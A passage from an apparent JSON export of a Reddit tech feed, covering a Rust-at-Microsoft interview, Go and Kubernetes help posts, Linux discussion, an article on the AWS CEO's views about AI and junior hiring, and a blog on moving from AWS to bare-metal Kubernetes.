have a great view of all this  as the chair of the Rust Foundation Board. I wanted to ask you a couple of questions about that.</p><p>What's been most surprising or challenging in your role kind of stewarding the Rust ecosystem at that level?</p><p>Before I came to Microsoft, I was at Mozilla. Starting to get the ideas together for the Rust Foundation is one of the things I was working on. The idea was to have an entity that could have a bank account where companies, especially big tech companies, could donate money to facilitate the Rust ecosystem. I had been a member of the Rust community for a really long time. I've been the lead editor of This Week in Rust since 2020. So, I had a really good feel for what interacting with the Rust community at the foundational level would be like. But, what I didn't fully appreciate until later was how different the culture is at different big tech companies. It's not a monolith. Microsoft's culture is very different from Amazon culture, which is very different from Meta's culture, different from Google's culture, different from Huawei's and so on. We didn't just need to figure out how the Foundation interacts with the project, which is technically a separate entity. We had to figure out how to have very different companies interact with both the Foundation and the project. And, there were some stumbling blocks at first, as there always are. It was a very big challenge, but I feel like we're in a much better place now.</p><p>I think that is an underappreciated aspect of these big companies, and it might make my next question a little weird. So, feel free to take it in whatever direction makes the most sense to you. What are some of the learnings about Rust adoption in these big organizations?</p><p>Something that seems consistent across many big orgs or even small orgs is that once developers get past the initial learning curve and start writing Rust, they really like it because of the memory safety aspects and the very helpful error messages that guide you to write better code. There is certainly an initial hesitation. For example, Microsoft has been writing things in C and C++ for a very, very, very long time. So, within Microsoft, there’s been plenty of initial hesitation. But, once people actually use the language, it is a game changer.</p><p>Getting over the initial learning curve is probably the hardest part of Rust adoption overall, but it has been getting better. I first started writing Rust in either 2016 or 2017 when I was at a startup called Chef. And the learning curve was huge. But, it has been getting better, both because of improvements to the language itself and the training that is available. Much of that training is free and open source, and I'm highly confident that this will continue to improve rapidly.</p><p>Is the Foundation invested in sort of easing the learning curve at all? Are there any initiatives around that?</p><p>There is a training initiative, with which there's active work ongoing. Something we're hearing more from companies outside the US than companies in the US is a desire for some sort of certification. They want their developer to do a particular training, pass a test or something, and then get a certificate that shows what that developer's base knowledge of Rust is.</p><p>Okay, interesting. You said that it was mostly outside of the US where you've heard the request?</p><p>This is not a scientific survey by any means, but I've been hearing it more from companies outside the US than inside the US. That said, there's certainly companies inside the US who are interested in that as well.</p><p>That kind of matches cultural differences I've seen. So another thing that I wanted to ask about is a follow-on on that. In your role at Microsoft, do you end up getting involved with other teams with their Rust adoption at all? Are you kind of a Rust advocate in the organization or do you just work on your team?</p><p>I do get involved. A lot of the time it's other teams that are just starting with Rust and are looking for people to do initial code reviews. So, I get involved there. We also have a pretty good internal Rust community within Microsoft. For example, there's a Teams channel where people can come in with questions. The best thing about the Rust community in general for me has always been how supportive it is.</p><p>Yeah. It’s a notably supportive community.</p><p>I'm seeing a similar level of supportiveness with the Rust community inside of Microsoft as well. People are very willing to help others get started and answer the questions that come up. Also, I'm not by any means the sole Rust advocate. In fact, we have a cloud advocate, Yosh Wuyts, who is a developer advocate for Rust.</p><p>Since Microsoft is such a large company, does the culture vary a lot from team to team?</p><p>It definitely does. Microsoft is 200,000+ people. So, I'd say it varies a lot from organization to organization, and the organizations are pretty darn big. It varies to a lesser extent from team to team within an organization. It’s also changed a lot recently. I would say that ten to fifteen years ago, I would not have wanted to join Microsoft based on what I knew about the company's overall culture. When Satya Nadella became CEO, he stewarded a massive improvement in the culture. The way he framed it was, \"We're moving from a know-it-all culture to a learn-it-all culture.\" That change took the better part of a decade, but it is real. If that hadn't taken place, I wouldn't have wanted to join Microsoft, and I probably wouldn't have wanted to stay at Microsoft. So yes, there's a variation in culture from team to team, but that overall improvement of Microsoft culture has really made my experience in everything that I've touched so far.</p><p>I hadn’t heard that \"know-it-all to learn-it-all\" quote. I love that. I assume part of that has been manifest in the embrace of open source that we've been seeing.</p><p>So just to clarify one point, when you talk about an organization within Microsoft, do you mean like Office versus Azure type thing?</p><p>Yeah, exactly. Office versus Azure. Azure is also huge. So, Azure Core for example is an organization within Azure. I'm sure there are some differences between Azure Core and other large organizations that are part of Azure.</p><p>If someone wanted to find a job where they can write Rust at Microsoft, I imagine just applying to Microsoft is kind of rolling the dice. So, how would you advise someone to go about specifically targeting Rust jobs at Microsoft?</p><p>Honestly, the best thing is to go to careers.microsoft.com and use the search term \"Rust.\" Headcount is usually for specific teams at Microsoft. Even in my case, searching for Rust at Microsoft is sometimes how I learn about different teams that are using Rust. I don't know if you can set up an alert on that. You might be able to, but I haven't delved into that.</p><p>Also, I would recommend following Rust developers at Microsoft on LinkedIn. A lot of us will post positions when they open on our teams. Also, knowing someone on the team you’re interested in can be a very good way to get your foot in the door. That said, if you don't know anyone on the team, definitely still apply. That's not necessarily a barrier. It's just a helpful thing if you have it.</p><p>Totally sound advice. One thing I wasn't sure about is the return to office trend. I haven't heard a lot from Microsoft about that. Are you guys in person now or what's going on there?</p><p>So far there has not been an RTO mandate, which I'm really happy about because it's a pretty long commute from where I live to the Microsoft campus. It's about an hour going in. It's sometimes 90 minutes coming back. I don't want to make that commute every day. Obviously, it is possible that this all changes. Obviously, those decisions are way, way, way above my head. But, so far hybrid work has continued to be the norm. The official guidance at Microsoft is that, by default, you can work remotely up to 50% of the time. There are some positions where that's not possible. For example, you might have to use very specific machines or work in specific areas. For the vast majority of us, you can work remotely up to 50% of the time and you may be able to work more with the permission of your manager. We’re also often spread out. For example, I live in Seattle. My manager lives in Florida. My skip level manager lives in Texas. My skip, skip lives in North Carolina. We are all over the place. So, thankfully no one's had any issue with me working remotely. I go in once or twice a week, but the rest of the time I'm working from home.</p><p>Do you get involved with hiring decisions at all? Is that part of your work?</p><p>Yeah, I've done quite a few interview loops.</p><p>In your experience, how do people tend to think about hiring at Microsoft? Are there characteristics that you're looking for?</p><p>When it comes to the behavioral part of an interview, there are core competencies that Microsoft gears its interview questions around. Those are collaboration, drive for results, customer focus, influencing for impact, judgment and adaptability. For the record, I did not have that memorized. I have that screen pulled up in front of me. But anyway, there are questions about experiences that speak to those competencies in the interviews.</p><p>Another nice thing is if you head to Microsoft's careers website, there is a section for hiring tips. There are some useful ones that include things like key things to prep. That includes the core competencies, how technical interviews are conducted, and so forth. Something I do like about Microsoft is the way technical interviews are done, because I've never been a person who's comfortable with whiteboarding. We use a platform that allows candidates to use an actual compiler for almost any language they want. It's a shared screen between the candidate and the interviewer. So, you can actually run your code and get the feedback that error messages give you. I find that a much better experience than trying to remember syntax and such in an interview.</p><p>Overall, the biggest tip I can give is keep on applying if you don’t get the position you initially applied for. Unlike other big tech companies, there's no cool down period where if you don't get a position you have to wait a certain amount of time before you can interview for another position. Microsoft does not do that. There are positions opening all the time. And, if your first application does not get accepted, the next one might. So definitely be persistent.</p><p>Remind me what it was you mentioned earlier. Were they called competencies?</p><p>The core competencies, yes.</p><p>Can you explain a little bit more how that works?</p><p>When we do an interview loop, each interviewee is assigned one or more core competencies to evaluate. So, for example, I've evaluated candidates for judgment. When that happens, I usually ask them questions about areas where they've had to use judgment. The question will be something like “Can you describe a time when you've had to make a judgment call about a technical decision or a non-technical decision?” I might ask them how they had to weigh different trade-offs and how those tradeoffs influenced the decision they ultimately made? That can show me a lot about someone's judgment.</p><p>Collaboration is another big one. I might ask someone to describe a time when they had to collaborate with another team where they didn't really know the other people on the other team well. These questions are always pretty open-ended, but what I'm looking for is people's experience in those core areas. My interviews are always over Teams. So, what I also do is copy and paste the question into the Teams chat so the interviewee can have it in front of them. Not all interviewers at Microsoft do that, but that's something I try to do because I know that always gave me a feeling of reassurance when I was interviewing.</p><p>So, to wrap things up, I wanted to ask from the Rust Foundation angle if there are opportunities to get involved that you think more people should know about?</p><p>Sure. So, I think it’s important to set the context beforehand that there is a separation between the Rust Project and the Rust Foundation. The Rust Project controls the technical direction of the Rust compiler, Rust language, et cetera. The Foundation supports the Project in those decisions, including running an on-call rotation for crates.io and other things, but it is technically a separate entity.</p><p>So, to get involved in the Rust Project, I recommend checking out the Rust language community site. That will guide you to where the community has conversations about different topics. This is how I got involved in the project years ago. And, it's a great way to get to know how the project works and where you might want to become involved.</p><p>To get involved in the Foundation, you can go to the Foundation website and check out the \"Get Involved\" section where you'll find some information about becoming a member of the Foundation, potentially hosting your project at the Rust Foundation, and more. For both the Rust Project and the Rust Foundation, I would love to see as many people as possible at RustConf 2025, which this year is in Seattle. It's in my hometown, so I’m super excited about that. That'll be from September 2nd through 5th. Lots of Foundation people will be there, and lots of Project people will be there. It's usually one of the most positive-feeling technical conferences that I've ever been to, and I've been to a lot of them. So, it's wonderful to get that sense of community as well.</p><p>Is there anything else you want to talk about that we didn't get the chance to talk about?</p><p>I guess I would just say that the security problems we face are only going to get bigger and more complex. Organizations are going to need more and more to incorporate security into their software at the compiler level. So, being skilled in the languages that allow you to do this, such as Rust, is only going to become more valuable. That’s especially true for that lower-level software that runs really close to the hardware.</p><p>I think you’re right. Personally, I’ve been seeing a lot of momentum behind that idea in, well, specifically defense actually. But, I think all of embedded- robotics, aerospace, etc. is realizing the value of the security that Rust brings. These are physical systems, and they are often some of the most sensitive systems in the world. They need to be totally secure. So, I think you're exactly right. I expect to see a lot of growth in Rust because of that. Thank you very much Nell. I really appreciate your time.</p>","contentLength":21242,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1mwl2d6/rust_at_microsoft_and_chairing_the_rust_foundation/"},{"title":"Tap: Interactive CLI Prompts for Go (early stage, looking for feedback)","url":"https://www.reddit.com/r/golang/comments/1mwkl03/tap_interactive_cli_prompts_for_go_early_stage/","date":1755804245,"author":"/u/yarlson2","guid":235888,"unread":true,"content":"<p>I’ve been building a library called <a href=\"https://github.com/yarlson/tap\"></a>. It’s inspired by the TypeScript project <a href=\"https://clack.cc/\">Clack</a> and brings similar interactive command-line prompts to Go.</p><p> Share the project for review and gather early feedback on the API design and direction.</p><ul><li> Provide a simple, event-driven toolkit for building interactive CLIs in Go.</li><li> The library is usable but still under heavy development. APIs may change. Core prompts (text, password, confirm, select, spinners, progress bars) are implemented and tested. Multi-select and autocomplete are still in progress.</li></ul><p> This is not an AI-generated repo — I’ve been developing it manually over several weeks. I did use ChatGPT to help draft parts of the README, but all code is written and reviewed by me.</p><pre><code>go get github.com/yarlson/tap@latest </code></pre><pre><code>name := prompts.Text(prompts.TextOptions{ Message: \"What's your name?\", Input: term.Reader, Output: term.Writer, }) if core.IsCancel(name) { return } confirmed := prompts.Confirm(prompts.ConfirmOptions{ Message: fmt.Sprintf(\"Hello %s! Continue?\", name), Input: term.Reader, Output: term.Writer, }) if confirmed.(bool) { prompts.Outro(\"Let's go!\") } </code></pre><ul><li>API ergonomics (does it feel Go-idiomatic?)</li><li>Missing prompt types you’d like to see</li><li>Any portability issues across different terminals/platforms</li></ul>","contentLength":1254,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Is the \"kube-dns\" service \"standard\"?","url":"https://www.reddit.com/r/kubernetes/comments/1mwj2na/is_the_kubedns_service_standard/","date":1755800860,"author":"/u/Haeppchen2010","guid":235851,"unread":true,"content":"<p>I a currently setting up an application platform on a (for me) new cloud provider.</p><p>Until now, I worked on AWS EKS and on on-premises clusters set up with kubeadm.</p><p>Both provided a Kubernetes Service  in the  namespace, on both AWS and kubeadm pointing to a CoreDNS deployment. Until now, I took this for granted.</p><p>Now I am working on a new cloud provider (OpenTelekomCloud, based on Huawei Cloud, based on OpenStack).</p><p>There, that service is missing, there's just the CoreDNS deployment. For \"normal\" workloads just using the provided , that's no issue.</p><p>After providing the Service myself (just pointing to the CubeDNS pods), it seems to work.</p><p>Now I am unsure who to blame (and thus how to fix it cleanly).</p><p>Is OpenTelekomCloud at fault for not providing that  Service? (TBH I noticed many \"non-kubernetesy\" things they do, like providing status information in their ingress resources by (over-)writing annotations instead of the  tree of the object like anyone else).</p><p>Or is Grafana/Loki at fault for assuming a <code>kube-dns.kube-system.cluster.local</code> is available everywhere? (One could extract the actual resolver from  in a startup script and configure nginx with this, too).</p><p>Looking for opinions, or better, documentation... Thanks!</p>","contentLength":1218,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Could Linux increasing popularity also affect security?","url":"https://www.reddit.com/r/linux/comments/1mwhjkj/could_linux_increasing_popularity_also_affect/","date":1755797437,"author":"/u/lafoxy64","guid":235830,"unread":true,"content":"<p>Since Linux is becoming more and more popular and more software/games/drivers are compatible with linux. Should we worry that the ammount of viruses and malware will become more common for Linux too? I know there ARE malware and viruses for Linux just like there are for macOS, they are just not as common as window's. In Linux you dont need an antivirus but your common sense to not click or download sus stuff. But since Linux is becoming more popular and more common (non techsavy) users are trying Linux, will this make Linux less secure?<p> Idk if people are starting to use some sort of antivirus? are there any worth trying out just in case? or should i not worry about that at all yet?</p> id like to read your thoughts on this</p>","contentLength":728,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Trying out Bubble Tea (TUI) — sharing my experience","url":"https://www.reddit.com/r/golang/comments/1mwgzsp/trying_out_bubble_tea_tui_sharing_my_experience/","date":1755796248,"author":"/u/R3Z4_boris","guid":235832,"unread":true,"content":"<p>I recently came across <a href=\"https://github.com/charmbracelet/bubbletea\">Bubble Tea</a>, a TUI framework for Go, and instantly fell in love with how , it renders terminal UIs. Just take a look at the examples in the repo — they look fantastic.</p><p><em>P.S. I’m not affiliated with the developers — just sharing my honest impressions.</em></p><p>At first glance, it all looks magical. But under the hood, Bubble Tea is quite  in terms of control and logic. It’s based on the <a href=\"https://guide.elm-lang.org/architecture/\">ELM architecture</a>, which revolves around three main components:</p><ol><li> — a struct that stores your app's state (cursor position, list items, input text, etc.)</li><li> — the only place where the state can be modified. It takes a message (user or internal event), returns a new model and optionally a command.</li><li> — this renders your model into the terminal. It’s your UI representation.</li></ol><p>Commands are both user events (like keypresses) and your own internal events. You can define any type as a command and handle them in a  inside the  function.</p><p>: Animated loading spinner</p><p>Let’s say we want to build a loading animation with 3 frames that loop every second. Here’s how that works in Bubble Tea:</p><ol><li>The  holds the current frame index and the list of frames.</li><li>You define a custom command: .</li><li>On init, you trigger the first  command.</li><li>In , you handle , increment the frame index, and schedule another  using a built-in delay.</li><li>Bubble Tea automatically re-renders using , where you simply return the current frame based on the index.</li><li>Boom — you have an infinite spinner</li></ol><p>I was surprised at how powerful the command-based architecture is — you can even use it for simple concurrency.</p><p>For example, let’s say you need to download 10 images using 3 workers. Here's one way to do it using commands:</p><ul><li>Create a command that checks if there’s more work in the queue. If yes, download the image, store the result, and re-issue the same command.</li><li>When starting, you fire off this command 3 times — essentially giving you 3 workers.</li><li>Once there are no more images to process, the command just stops re-issuing itself.</li></ul><p>This gives you <strong>a surprisingly elegant and simple form of parallelism</strong> within the Bubble Tea architecture — much easier than trying to shoehorn traditional goroutines/channels into a responsive UI system.</p><p>As soon as you start building anything non-trivial, <strong>your whole app becomes ELM</strong>. You really have to embrace the architecture. It’s not obvious at first, but becomes clearer with some trial and error.</p><p>Here are some tips that helped me:</p><ul><li><strong>LLMs are terrible at writing Bubble Tea apps</strong>. Seriously. Most AI-generated code is unreadable spaghetti. Plan the architecture, model, and file structure yourself. Then, maybe let the AI help with debugging or tiny snippets.</li><li><strong>Separate concerns properly</strong>. Split your , , and  logic. Even the official examples can be painful to read without this.</li><li><strong>Update grows into a monster fast</strong>. Add helper methods and encapsulate logic so it remains readable. Otherwise, you’ll end up with 300 lines in one function.</li><li> into a separate file — colors, borders, spacing, etc. It’ll make your code way more maintainable.</li><li><strong>Refactor once the feature works</strong>. You'll thank yourself later when revisiting the code.</li></ul><blockquote><p>These are general programming tips — but in Bubble Tea, ignoring them comes back to bite you .</p></blockquote><p>I built a visual dependency manager for  — it scans your dependencies and shows which ones can or should be updated. This is useful because Go’s default  updates , and often breaks your build in the process</p><p>It’s a simple but helpful tool, especially if you manage dependencies manually.</p><p>There's a GIF in the README that shows the interface in action. Feedback, feature requests, and code reviews are very welcome — both on the tool and on my use of Bubble Tea.</p>","contentLength":3672,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Dolphin on non-KDE distros with a dark theme: the horror","url":"https://ludditus.com/2024/09/24/dolphin-on-non-kde-distros-with-a-black-theme-the-caveats/","date":1755793693,"author":"/u/alberto-m-dev","guid":235805,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1mwftnl/dolphin_on_nonkde_distros_with_a_dark_theme_the/"},{"title":"highly available K3s cluster on AWS (multi-AZ) - question on setting up the master nodes","url":"https://www.reddit.com/r/kubernetes/comments/1mwfmmh/highly_available_k3s_cluster_on_aws_multiaz/","date":1755793269,"author":"/u/Ok-Personality-1995","guid":236741,"unread":true,"content":"<p>When setting up a <strong>highly available K3s cluster on AWS (multi-AZ)</strong>, should the  be joined using the  or its ?</p><p>I’ve seen guides that recommend always using the NLB DNS name (with  set), even for the very first master, while others suggest bootstrapping the first master with its own private IP and then using the NLB for subsequent masters and workers.</p><p>For example, when installing the first control plane node, should I do this:</p><pre><code># Option A: Use NLB endpoint (k3s-api.internal is a private Route53 record) curl -sfL https://get.k3s.io | \\ INSTALL_K3S_EXEC=\"server \\ --tls-san k3s-api.internal \\ --disable traefik \\ --cluster-init\" \\ sh - </code></pre><p>Or should I use the node’s own private IP like this?</p><pre><code># Option B: Use private IP curl -sfL https://get.k3s.io | \\ INSTALL_K3S_EXEC=\"server \\ --advertise-address=10.0.1.10 \\ --node-external-address=10.0.1.10 \\ --disable traefik \\ --cluster-init\" \\ sh - </code></pre><p>Which approach is more correct for AWS multi-AZ HA setups, and what are the pros/cons of each (especially around <strong>API availability, certificates, and NLB health checks</strong>)?</p><p>Do you have any suggestion on Longhorn - whether should it be a part of the infra repo which builds the VPC, EC2s, etc, and then using Ansible installs the K3S and configures it. </p><p>Should I also keep the Longhorn inside it or should it be a part of the other repo? I will also be going to install the ArgoCD so not sure if I combine it with it! </p><p>Thanks very much in advance!!!</p>","contentLength":1427,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Has anyone serioly tired to make comuity CA thats OEM trusts","url":"https://www.reddit.com/r/linux/comments/1mwfj7b/has_anyone_serioly_tired_to_make_comuity_ca_thats/","date":1755793059,"author":"/u/JG_2006_C","guid":235804,"unread":true,"content":"<div><p>why do we all shim of microsoft woldnt we be bether of with polics free non profit runnig a CA and handing out sigatures on bulds for distros. Anyone a good expainer why. Is it cause were one big drama club that reminets twiche while shouting i a echo camber while doing noting, baout this poteisoly great idea for sovertly form microft abd posibly verify laptops form factory for Linux all around with the Indepent CA</p></div>   submitted by   <a href=\"https://www.reddit.com/user/JG_2006_C\"> /u/JG_2006_C </a>","contentLength":450,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Let's make a game! 309: Telling companions to flee","url":"https://www.youtube.com/watch?v=rhkU58kEckk","date":1755792625,"author":"/u/apeloverage","guid":235852,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mwfbx4/lets_make_a_game_309_telling_companions_to_flee/"},{"title":"Deskflow update: 10 months on with steady development","url":"https://www.reddit.com/r/linux/comments/1mwf82n/deskflow_update_10_months_on_with_steady/","date":1755792389,"author":"/u/nbolton","guid":235806,"unread":true,"content":"<p>About 10 months ago I posted that <a href=\"https://www.reddit.com/r/linux/comments/1g5a4bn/deskflow_is_now_the_upstream_of_synergy/\">Deskflow had become the upstream of Synergy</a>. Since then the project has kept up steady development. In the past month there have been over 100 commits, dozens of merged PRs, and contributions from several new community members (<a href=\"https://github.com/deskflow/deskflow/pulse/monthly\">pulse</a>).</p><p>Barrier (a fork) has been unmaintained for quite a while, and Input Leap, which forked from it, now seems to have <a href=\"https://github.com/input-leap/input-leap/pulse/monthly\">slowed down too</a>. In both of those projects, we still see people open PRs or raise issues there and wait without a reply. One of the main goals with Deskflow is to make sure contributors get responses and progress continues.</p><p>If you have tried Deskflow recently, it would be great to hear your experience.</p>","contentLength":685,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"The Death of the Page Cache? From mmap() to NVMe-ZNS and User-Space File Systems","url":"https://codemia.io/blog/path/The-Death-of-the-Page-Cache-From-mmap-to-NVMe-ZNS-and-User-Space-File-Systems","date":1755791817,"author":"/u/mqian41","guid":235802,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mwey6c/the_death_of_the_page_cache_from_mmap_to_nvmezns/"},{"title":"Devs, have you regretted switching to an atomic/immutable Linux? (from a vanilla one)","url":"https://www.reddit.com/r/linux/comments/1mwdwez/devs_have_you_regretted_switching_to_an/","date":1755789538,"author":"/u/RetiredApostle","guid":235763,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Gorilla/session + PGStore","url":"https://www.reddit.com/r/golang/comments/1mwdelh/gorillasession_pgstore/","date":1755788471,"author":"/u/Low_Expert_5650","guid":235735,"unread":true,"content":"<p>Is Gorilla/session + PGStore a good kit to manage sessions? My application serves integration API (I use JWT for authentication via API) and serves a web system too (I believe that using JWT for session is kind of a joke, I would have to see a way to revoke etc.)</p>","contentLength":263,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Can i run bun script inside go code?","url":"https://www.reddit.com/r/golang/comments/1mwd1j8/can_i_run_bun_script_inside_go_code/","date":1755787691,"author":"/u/whyyoucrazygosleep","guid":235807,"unread":true,"content":"<p>I have to use nodejs library in my project. I dont want create e exress like web app and make request with go. I saw a picture go inside bun. Maybe there is something like this idk.</p>","contentLength":181,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"AWS CEO says AI replacing junior staff is 'dumbest idea'","url":"https://www.theregister.com/2025/08/21/aws_ceo_entry_level_jobs_opinion/","date":1755787641,"author":"/u/creaturefeature16","guid":235831,"unread":true,"content":"<p>Amazon Web Services CEO Matt Garman has suggested firing junior workers because AI can do their jobs is \"the dumbest thing I've ever heard.\"</p><p>Garman made that remark in <a target=\"_blank\" rel=\"nofollow\" href=\"https://www.youtube.com/watch?v=nfocTxMzOP4\">conversation</a> with AI investor Matthew Berman, during which he talked up AWS’s <a target=\"_blank\" href=\"https://www.theregister.com/2025/08/18/aws_updated_kiro_pricing/\">Kiro AI-assisted coding tool</a> and said he's encountered business leaders who think AI tools \"can replace all of our junior people in our company.\"</p><p>That notion led to the “dumbest thing I've ever heard” quote, followed by a justification that junior staff are “probably the least expensive employees you have” and also the most engaged with AI tools.</p><p>“How's that going to work when ten years in the future you have no one that has learned anything,” he asked. “My view is you absolutely want to keep hiring kids out of college and teaching them the right ways to go build software and decompose problems and think about it, just as much as you ever have.”</p><p>Naturally he thinks AI – and Kiro, natch – can help with that education.</p><p>Garman is also not keen on another idea about AI – measuring its value by what percentage of code it contributes at an organization.</p><p>“It’s a silly metric,” he said, because while organizations can use AI to write “infinitely more lines of code” it could be bad code.</p><p>“Often times fewer lines of code is way better than more lines of code,” he observed. “So I'm never really sure why that's the exciting metric that people like to brag about.”</p><p>That said, he’s seen data that suggests over 80 percent of AWS’s developers use AI in some way.</p><p>“Sometimes it's writing unit tests, sometimes it's helping write documentation, sometimes it's writing code, sometimes it's kind of an agentic workflow” in which developers collaborate with AI agents.</p><p>Garman said usage of AI tools by AWS developers increases every week.</p><p>The CEO also offered some career advice for the AI age, suggesting that kids these days need to learn how to learn – and not just learn specific skills.</p><p>“I think the skills that should be emphasized are how do you think for yourself? How do you develop critical reasoning for solving problems? How do you develop creativity? How do you develop a learning mindset that you're going to go learn to do the next thing?”</p><p>Garman thinks that approach is necessary because technological development is now so rapid it’s no longer sensible to expect that studying narrow skills can sustain a career for 30 years. He wants educators to instead teach “how do you think and how do you decompose problems”, and thinks kids who acquire those skills will thrive. ®</p>","contentLength":2582,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1mwd0pg/aws_ceo_says_ai_replacing_junior_staff_is_dumbest/"},{"title":"New release coming: here's how YOU can help Kubernetes","url":"https://www.reddit.com/r/kubernetes/comments/1mwcvch/new_release_coming_heres_how_you_can_help/","date":1755787316,"author":"/u/thockin","guid":235731,"unread":true,"content":"<p>Kubernetes is a HUGE project, but it needs your help. Yes YOU. I don't care if you have a year of experience on a 3 node cluster or 10 years on 10 clusters of 1000 nodes each.</p><p>I know Kubernetes development can feel like a snail's pace, but the consequences of GAing something we then figure out was wrong is a very expensive problem. We need user feedback. But users DON'T USE alphas, and even betas get very limited feedback.</p><p>The SINGLE MOST USEFUL thing anyone here can do for the Kubernetes project is to try out the alpha and beta features, push the limits of new APIs, try to break them, and SEND US FEEDBACK. </p><p>Just \"I tried it for XYZ and it worked great\" is incredibly useful.</p><p>\"I tried it for ABC and struggled with ...\" is critical to us getting it close to right.</p><p>Whether it's a clunky API, or a bad default, or an obviously missing capability, or you managed to trick it into doing the wrong thing, or found some corner case, or it doesn't work well with some other feature - please let us know. GitHub or slack or email or even posting here!</p><p>I honestly can't say this strongly enough. As a mature project, we HAVE TO bias towards safety, which means we substitute time for lack of information. Help us get information and we can move faster in time (and make a better system).</p>","contentLength":1281,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[P] Language Diffusion in <80 Lines of Code","url":"https://www.reddit.com/r/MachineLearning/comments/1mwbq81/p_language_diffusion_in_80_lines_of_code/","date":1755784794,"author":"/u/bjjonin","guid":235803,"unread":true,"content":"<p>Hi! Lately, I've been looking into diffusion language models and thought I should try and replicate part of the paper <a href=\"https://arxiv.org/abs/2502.09992\">Large Language Diffusion Models</a> by Nie et al. (2025). With the help of Hugging Face's Transformers, it took &lt;80 lines of code to implement the training script. I finetuned <a href=\"https://huggingface.co/distilbert/distilbert-base-cased\">DistilBERT</a> on the <a href=\"https://huggingface.co/datasets/roneneldan/TinyStories\">TinyStories</a> dataset, and the results were better than expected!</p>","contentLength":371,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"How moving from AWS to Bare-Metal K8s saved us $230,000 /yr.","url":"https://oneuptime.com/blog/post/2023-10-30-moving-from-aws-to-bare-metal/view","date":1755784587,"author":"/u/OuPeaNut","guid":235697,"unread":true,"content":"<p>In the ever-evolving world of technology, businesses are constantly looking for ways to optimize their operations and reduce costs. One such journey we embarked on was moving our infrastructure from Amazon Web Services (AWS) to a bare-metal solution. This transition not only provided us with more control over our resources but also resulted in substantial financial savings.</p><p>While the cost savings and technological benefits were significant factors in our decision to move from AWS to a bare-metal solution, there was another crucial reason behind this transition.</p><p><strong>Most of our customers are on the public cloud, and part of our service involves notifying them when the public cloud goes down. To ensure we can provide this service reliably and independently of the public cloud’s status, we needed to be on our own dedicated data center.</strong></p><p>By moving to a bare-metal solution in a colocation facility, we’ve been able to achieve this independence. This move has not only resulted in substantial cost savings but also enhanced our service reliability and customer communication, further demonstrating the multifaceted benefits of considering alternative infrastructure solutions.</p><h3>Our Initial Setup: Kubernetes on AWS</h3><p>In the early stages of our technological journey, we adopted a Kubernetes cluster on Amazon Web Services (AWS), utilizing their managed Elastic Kubernetes Service (EKS) offering.</p><p>OneUptime, our open-source observability platform is built on a robust foundation of open-source software such as Redis, Postgres, Clickhouse, Docker, NodeJS, and BullMQ. Interestingly, none of these technologies are AWS-specific. This choice was intentional and strategic.</p><p><strong>Our goal was to avoid reliance on AWS or any proprietary cloud technology.</strong> The reason? We wanted to empower our customers with the ability to self-host OneUptime on their own clusters. This approach not only aligns with our commitment to open-source but also provides our customers with greater control and flexibility. For those interested in self-hosting OneUptime, the Helm chart is readily available on <a href=\"https://artifacthub.io/packages/helm/oneuptime/oneuptime?ref=blog.oneuptime.com\">Artifact Hub here</a>.</p><p>While AWS offered us flexibility and scalability, we began to realize that these benefits could be achieved elsewhere and at a fraction of the cost. This realization sparked a shift in our approach and led us to explore more cost-effective yet equally efficient alternatives.</p><h3>The Transition: Moving to Bare-Metal</h3><p>In our continuous pursuit of technological excellence, we recently made the strategic decision to transition to a bare-metal solution. Our choice was to run a Microk8s cluster in a colocation facility, a decision driven by our past experiences and future aspirations.</p><p>Historically, we’ve always maintained an internal self-hosted test cluster on Microk8s. This hands-on experience with a Kubernetes flavor not only enriched our understanding but also bolstered our confidence in setting up a production-ready cluster.</p><p><strong>There’s a common misconception that Microk8s is solely for edge computing or development purposes. However, this couldn’t be further from the truth. In fact, numerous companies, including ours, are now leveraging Microk8s in production environments.</strong> This shift is testament to the robustness and versatility of Microk8s, proving it to be a viable option for diverse use-cases.</p><p>Transitioning to bare-metal servers has provided us with dedicated resources, effectively eliminating the ‘noisy neighbor’ issue often experienced in shared hosting environments like AWS. This issue arises when multiple customers share the same server resources, leading to performance degradation if one customer hogs more than their fair share of resources.</p><p>Now, we have complete control over our hardware. This autonomy allows us to fine-tune our servers to meet our specific needs, optimizing performance and efficiency. We can customize every aspect of our infrastructure, from the operating system and network architecture to the type and amount of storage used.</p><h3>The Role of Kubernetes and Helm in Our Transition</h3><p>Technologies like  and  have played a significant role in our transition from the cloud to our own servers. Kubernetes, an open-source platform designed to automate deploying, scaling, and operating application containers, has made it easier for us to manage our applications on our own servers.</p><p>Helm, on the other hand, is a package manager for Kubernetes that simplifies the process of defining, installing, and upgrading complex Kubernetes applications. It’s like a homebrew for Kubernetes; it packages up applications into charts (collections of files that describe a related set of Kubernetes resources) that can be deployed onto your cluster.</p><p>These technologies have made it incredibly easy to ‘de-cloud’ and move to our own servers. They’ve provided us with the flexibility and control we needed while ensuring that the transition was smooth and efficient.</p><h3>Storage and LoadBalancers</h3><p>Most people are confused on how are volumes provisioned and how are load balancers provisioned on a bare metal kubernets cluster,</p><p>We use MicroCeph for volumes. Ceph is a distributed storage cluster. Microk8s makes it 